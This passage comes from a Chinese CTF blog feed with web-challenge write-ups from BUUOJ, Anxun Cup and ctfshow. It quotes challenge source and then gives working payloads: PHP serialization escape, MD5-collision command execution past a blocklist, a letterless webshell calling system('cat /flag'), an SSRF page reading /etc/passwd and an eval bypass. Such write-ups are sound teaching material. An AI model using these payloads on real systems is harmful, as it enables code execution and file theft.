href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = sha1(base64_encode($_GET[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>function有三个参数，根据提示在phpinfo()页面可以找到提示，访问一下</p><img src="/2020/05/11/buuoj2/23.png" class="" title="examplename"><p>可以看到自动包含了一个文件，打开不能读取数据，可以看到应该要用序列化的字符逃逸，序列化时会经过一个过滤函数，过滤掉的字符在序列化数据中就可以去掉一些不必要的数据</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>"</span>;s:<span class="number">3</span>:“img”;s:<span class="number">20</span>:“ZDBnM19mMWFnLnBocA==”;s:<span class="number">2</span>:“dd”;s:<span class="number">1</span>:“a”;&#125;</span><br></pre></td></tr></table></figure><p>序列化后：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:“user”;s:<span class="number">24</span>:“flagflagflagflagflagflag”;s:<span class="number">8</span>:“<span class="function"><span class="keyword">function</span>”</span>;s:<span class="number">59</span>:“a”;s:<span class="number">3</span>:“img”;s:<span class="number">20</span>:“ZDBnM19mMWFnLnBocA==”;s:<span class="number">2</span>:“dd”;s:<span class="number">1</span>:“a”;&#125;<span class="string">";s:3:“img”;s:28:“L3VwbG9hZC9ndWVzdF9pbWcuanBn”;&#125;</span></span><br><span class="line"><span class="string">//由于没有传img_path参数，源代码给了默认的参数值guest_img.png</span></span><br></pre></td></tr></table></figure><p>经过过滤之后flag被去掉，空出了24个字符就会往后拿</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:“user”;s:<span class="number">24</span>:<span class="string">""</span>;s:<span class="number">8</span>:“<span class="function"><span class="keyword">function</span>”</span>;s:<span class="number">59</span>:“a”;s:<span class="number">3</span>:“img”;s:<span class="number">20</span>:“ZDBnM19mMWFnLnBocA==”;s:<span class="number">2</span>:“dd”;s:<span class="number">1</span>:“a”;&#125;<span class="string">";s:3:“img”;s:28:“L3VwbG9hZC9ndWVzdF9pbWcuanBn”;&#125;</span></span><br></pre></td></tr></table></figure><p>这样a:3刚好有三个键值对，后面的<code>&quot;;s:3:“img”;s:28:“L3VwbG9hZC9ndWVzdF9pbWcuanBn”;}</code>就被去掉了</p><img src="/2020/05/11/buuoj2/24.png" class="" title="examplename"><p>再改一下要读取的文件base64编码</p><img src="/2020/05/11/buuoj2/25.png" class="" title="examplename"><h4 id="0X11-安洵杯-2019-easy-web"><a href="#0X11-安洵杯-2019-easy-web" class="headerlink" title="0X11:[安洵杯 2019]easy_web"></a>0X11:[安洵杯 2019]easy_web</h4><p>打开题目，没有发现什么有用的信息，只看到了一个MD5 is fun，抓一下包，感觉img参数比较可疑</p><img src="/2020/05/11/buuoj2/26.png" class="" title="examplename"><p>base64解密两次，hex解密一次，发现是555.png，那么index.phphex加密，再base64加密两次可能可以访问</p><p>成功拿到源码，去掉了部分没用的东西</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"xixi～ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>md5碰撞直接可以找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p>可以发现几乎过滤了所有的读取方式，上次的比赛记得cat可以用ca\t绕过，具体的原因也没有去查找资料，有时间再弄，这里直接拿来用了</p><img src="/2020/05/11/buuoj2/27.png" class="" title="examplename"><p>在根目录下发现flag文件，直接读取</p><img src="/2020/05/11/buuoj2/27.png" class="" title="examplename">]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0X01-ZJCTF-2019-NiZhuanSiWei&quot;&gt;&lt;a href=&quot;#0X01-ZJCTF-2019-NiZhuanSiWei&quot; class=&quot;headerlink&quot; title=&quot;0X01:[ZJCTF 2019]NiZhuanSiWei&quot;&gt;&lt;/a&gt;0X01:[ZJCTF 2019]NiZhuanSiWei
    
    </summary>
    
    
    
      <category term="5.11begin" scheme="http://yoursite.com/tags/5-11begin/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow</title>
    <link href="http://yoursite.com/2020/05/05/ctfshow/"/>
    <id>http://yoursite.com/2020/05/05/ctfshow/</id>
    <published>2020-05-05T03:29:39.000Z</published>
    <updated>2020-05-09T00:27:11.147Z</updated>
    
    <content type="html"><![CDATA[<h1 id="36D杯"><a href="#36D杯" class="headerlink" title="36D杯"></a>36D杯</h1><a id="more"></a><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h4 id="0X01-你取吧"><a href="#0X01-你取吧" class="headerlink" title="0X01:你取吧"></a>0X01:你取吧</h4><p>打开题目，给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$hint=file_get_contents(<span class="string">'php://filter/read=convert.base64-encode/resource=hhh.php'</span>);</span><br><span class="line">$code=$_REQUEST[<span class="string">'code'</span>];</span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'l'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'\~'</span>,<span class="string">'\^'</span>);</span><br><span class="line">$blacklist = array_merge($_);</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/im'</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'nonono'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"echo($code);"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里有两种解法，分别是Ying师傅和HA1C9ON师傅的，下面来尝试一下</p><p>1.之前为了做红包题看过一篇p牛的无数字无字母RCE，只不过当时没想到可以这样做，下面是p牛的写的webshell，直接打就行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="string">" "</span>);</span><br><span class="line">$_=[];</span><br><span class="line">$_=@<span class="string">"$_"</span>; <span class="comment">// $_='Array';</span></span><br><span class="line">$_=$_[<span class="string">'!'</span>==<span class="string">'@'</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line">$___=$_; <span class="comment">// A</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; <span class="comment">// E </span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// R</span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$___.=$__;</span><br><span class="line"></span><br><span class="line">$____=<span class="string">'_'</span>;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// P</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// O</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// S</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]);<span class="comment">// // ASSERT($_POST[_]);</span></span><br><span class="line"><span class="comment">//再post提交_=system("cat /flag");</span></span><br></pre></td></tr></table></figure><p>2.根据代码的意思，用${$<em>{7}.$</em>{8}.$<em>{12}.$</em>{19}}可以拼凑出$hint，这样就能顺利以base64的方式读取hhh.php文件了，解密得到是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">"/phpjiami.zip\n/hint.php"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>下载压缩包，解密源码，得到一句话</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ch = explode(<span class="string">"."</span>,<span class="string">"hello.ass.world.er.rt.e.saucerman"</span>);</span><br><span class="line">$c = $ch[<span class="number">1</span>].$ch[<span class="number">5</span>].$ch[<span class="number">4</span>]; </span><br><span class="line">@$c($_POST[<span class="number">7</span><span class="number">-1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>POST</p><p><strong>6=system(‘cat /flag’);</strong>就可以拿到flag</p><img src="/2020/05/05/ctfshow/%E4%BD%A0%E6%8B%BF%E5%90%A7.png" class="" title="examplename"><h4 id="0X02：RemoteImageDownloader"><a href="#0X02：RemoteImageDownloader" class="headerlink" title="0X02：RemoteImageDownloader"></a>0X02：RemoteImageDownloader</h4><p>打开题目，给了一个http？？？？，可能是ssrf注入，测试一下发现下载了一张截图图片</p><p>vps监听</p><img src="/2020/05/05/ctfshow/RemoteImageDownloader.png" class="" title="examplename"><p>根据提示，去找资料，有文章<a href="https://www.anquanke.com/post/id/86371，里面有poc" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86371，里面有poc</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="actionscript"> x=<span class="keyword">new</span> XMLHttpRequest; </span></span><br><span class="line"><span class="actionscript"> x.onload=<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123; </span></span><br><span class="line"><span class="javascript"> <span class="built_in">document</span>.write(<span class="keyword">this</span>.responseText) </span></span><br><span class="line"> &#125;; </span><br><span class="line"><span class="actionscript"> x.open(<span class="string">"GET"</span>,<span class="string">"file:///etc/passwd"</span>); </span></span><br><span class="line"> x.send(); </span><br><span class="line"> <span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在自己的vpsweb服务目录下起个网页，再把目标改为flag</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heaed</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">x = <span class="keyword">new</span> XMLHttpRequest;</span></span><br><span class="line"><span class="actionscript">x.onload=<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="keyword">this</span>.responseText)</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="actionscript">x.open(<span class="string">"GET"</span>,<span class="string">"file:///flag"</span>);</span></span><br><span class="line">x.send();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在网页直接读取下载这个文件，成功拿到flag</p><img src="/2020/05/05/ctfshow/RemoteImageDownloader1.png" class="" title="examplename"><h4 id="0X03：给你shell"><a href="#0X03：给你shell" class="headerlink" title="0X03：给你shell"></a>0X03：给你shell</h4><p>在网页源码处找到了跳转页面，跳转</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line"><span class="comment">//It's no need to use scanner. Of course if you want, but u will find nothing.</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'view_source'</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkCookie</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    $arr = explode(<span class="string">':'</span>, $s);</span><br><span class="line">    <span class="keyword">if</span> ($arr[<span class="number">0</span>] === <span class="string">'&#123;"secret"'</span> &amp;&amp; preg_match(<span class="string">'/^[\"0-9A-Z]*&#125;$/'</span>, $arr[<span class="number">1</span>]) &amp;&amp; count($arr) === <span class="number">2</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !theFirstTimeSetCookie() ) setcookie(<span class="string">'secret'</span>, <span class="string">''</span>, time()<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">haveFun</span><span class="params">($_f_g)</span> </span>&#123;</span><br><span class="line">    $_g_r = <span class="number">32</span>;</span><br><span class="line">    $_m_u = md5($_f_g);</span><br><span class="line">    $_h_p = strtoupper($_m_u);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $_g_r; $i++) &#123;</span><br><span class="line">        $_i = substr($_h_p, $i, <span class="number">1</span>);</span><br><span class="line">        $_i = ord($_i);</span><br><span class="line">        print_r($_i &amp; <span class="number">0xC0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>($_COOKIE[<span class="string">'secret'</span>]) ? $json = $_COOKIE[<span class="string">'secret'</span>] : setcookie(<span class="string">'secret'</span>, <span class="string">'&#123;"secret":"'</span> . strtoupper(md5(<span class="string">'y1ng'</span>)) . <span class="string">'"&#125;'</span>, time()+<span class="number">7200</span> );</span><br><span class="line">checkCookie($json) ? $obj = @json_decode($json, <span class="keyword">true</span>) : <span class="keyword">die</span>(<span class="string">'no'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($obj &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'give_me_shell'</span>])) &#123;</span><br><span class="line">    ($obj[<span class="string">'secret'</span>] != $flag_md5 ) ? haveFun($flag) : <span class="keyword">echo</span> <span class="string">"here is your webshell: $shell_path"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>;</span><br></pre></td></tr></table></figure><p>逻辑：</p><ul><li>cookie，存的是json</li><li>checkCookie()函数检测json数据只有一对键值对</li><li>secret!=$flag_md5，调用havefun函数，否则就输出shell地址</li></ul><p>经过测试，数字&amp;0xC0都为0，字母&amp;0xC0都是64，flag的MD5值为327a6c4304ad5938eaf0efb6cc3e53dc，刚好是000打头，弱类型直接上burp爆破</p><img src="/2020/05/05/ctfshow/shell1.png" class="" title="examplename"><p>根据提示，到下一步</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//there are some secret waf that you will never know, fuzz me if you can</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">"hidden_filter.php"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$_SESSION[<span class="string">'login'</span>])</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'&lt;script&gt;location.href=\'./index.php\'&lt;/script&gt;'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match($secret_waf, $code)) &#123;</span><br><span class="line">        <span class="comment">//清空session 从头再来</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"\$_SESSION["</span> . $code . <span class="string">"]=false;"</span>); <span class="comment">//you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面就是看Ying师傅的wp做了，fuzz黑名单过滤了一下东西</p><ul><li>f、sys、include</li><li>括号、引号、分号</li><li>^ &amp;等运算符</li><li>空格 / \ $ ` * #等符号</li></ul><p>这里带括号的函数，空格，分号都不能使用，命令拼接也无效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;]&#x3D;1?&gt;&lt;?&#x3D;require~%d0%99%93%9e%98%d1%8b%87%8b?&gt;</span><br><span class="line">&#x2F;&#x2F;用?&gt;&lt;?来bypass分号</span><br><span class="line">&#x2F;&#x2F;PHP黑魔法 require和取反运算符之间不需要空格照样执行</span><br><span class="line">&#x2F;&#x2F;没有括号 使用那些不需要括号的函数 这里使用require</span><br><span class="line">&#x2F;&#x2F;]&#x3D;1来闭合session</span><br></pre></td></tr></table></figure><img src="/2020/05/05/ctfshow/shell2.png" class="" title="examplename"><p>拿到flag</p><h4 id="0X04：WEB-ALL-INFO-U-WANT"><a href="#0X04：WEB-ALL-INFO-U-WANT" class="headerlink" title="0X04：WEB_ALL_INFO_U_WANT"></a>0X04：WEB_ALL_INFO_U_WANT</h4><img src="/2020/05/05/ctfshow/want1.png" class="" title="examplename"><p>看到提示，用扫描器扫到index.php.bak,下载文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 